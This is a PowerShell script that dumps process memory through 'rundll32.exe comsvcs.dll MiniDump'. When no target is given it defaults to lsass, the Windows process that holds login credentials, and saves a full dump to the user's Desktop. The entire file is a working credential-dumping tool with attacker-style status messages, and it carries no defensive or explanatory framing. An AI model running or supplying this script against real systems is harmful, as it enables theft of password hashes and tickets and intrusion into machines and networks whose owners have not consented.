param(
    [Parameter(Mandatory=$false)][string] $out_path, 
    [Parameter(Mandatory=$false)][int] $process_id,
    [Parameter(Mandatory=$false)][string] $process_name
)

$ErrorActionPreference = 'stop'

function get_pid($process_name)
    {
    try
        {
        $process_id = get-process $process_name | Select-Object -expand id
        }
    Catch 
        {
        write-host "[-] Error: Could not convert process name to PID."
        exit
        }
    if (($process_id.GetType().FullName -ne "System.Int32") -or ($process_id -eq 0))
        {
        write-host "[-] Error: Could not convert process name to PID."
        exit
        }
    return $process_id
    }


if ($process_id -and $process_name)
    {
    write-host "[-] Error: Provide Process_id OR Process_name, not both!"
    exit
    }

elseif (!$process_id -and !$process_name)
    {
    write-host "[*] Process not set. defaulting to Lsass."
    $process_name = "lsass"
    }

if ($process_name)
    {    
    $process_id = get_pid $process_name
    write-host "[*] Process_name:" $process_name "--> Process_ID:" $process_id
    }
else
    {
    try
        {
        get-process -pid $process_id | Out-Null
        }
    catch
        {
        write-host "[-] Error: Could not find PID" $process_id
        exit
        }
    }

if (!$out_path)
    {
    $out_path = [string](Resolve-Path -Path "~\Desktop\") + $process_id + ".dmp"
    }  
 
     
$command_line = "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump " + $process_id + " " + $out_path + " full"
Invoke-Expression $command_line

start-sleep 2

if (test-path $out_path)
    {
    Write-Host "[+] Process" $process_id "dumped successfuly to" $out_path -ForegroundColor Cyan
    }

else
    {
    Write-Host "[-] Error: something went wrong :("
    }
